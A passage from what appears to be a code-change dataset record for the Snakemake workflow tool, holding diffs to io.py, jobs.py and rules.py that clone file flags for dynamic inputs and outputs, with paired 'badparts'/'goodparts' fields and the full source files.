self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"},"\/snakemake\/jobs.py":{"changes":[{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]},{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"},"\/snakemake\/remote_providers\/__init__.py":{"changes":[{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]},{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]}]},"\/snakemake\/rules.py":{"changes":[{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]},{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards 